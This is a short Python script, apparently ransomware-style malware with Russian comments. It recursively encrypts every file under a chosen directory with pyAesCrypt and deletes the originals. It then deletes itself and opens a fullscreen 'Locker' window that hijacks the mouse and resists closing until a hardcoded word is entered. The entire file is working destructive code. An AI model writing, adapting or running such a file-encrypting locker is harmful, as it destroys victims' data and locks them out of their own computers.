from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
import pyAesCrypt
import os, sys
direct=input("Write the root directory: ")
password=input("Write the password: ")
def crypt(file):
	bufferSize = 512*1024
	pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
	print("[crypted] '"+str(file)+".crp'")
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir, name)
		if os.path.isfile(path): crypt(path)
		else: walk(path)
walk(direct)
os.remove(str(sys.argv[0]))
print("[+] File 'crypt.py' successfully saved!")
def callback(event):
	global k,entry
	if entry.get()=="hello": k=True
def on_closing():
	click(675, 420)
	moveTo(675, 420)
	root.attributes("-fullscreen",True)
	root.protocol("WM_DELETE_WINDOW", on_closing)
	root.update()
	root.bind('<Control-KeyPress-c>', callback)
root = Tk() # Создание окна
root.title("Locker") # Заголовочное название
root.attributes("-fullscreen",True) # Расширение под экран
entry = Entry(root,font=1) # Поле ввода
entry.place(width=150,height=50,x=600,y=400) # Координаты и размеры
label0 = Label(root,text="Locker_by_#571",font=1) # Надпись 1
label0.grid(row=0,column=0) # Координаты надписи 1
label1 = Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20') # Надпись 2
label1.place(x=470,y=300) # Координаты надписи 2
root.update(); sleep(0.2); click(675, 420) # Обновление экрана программы
k = False
while k != True:
	on_closing()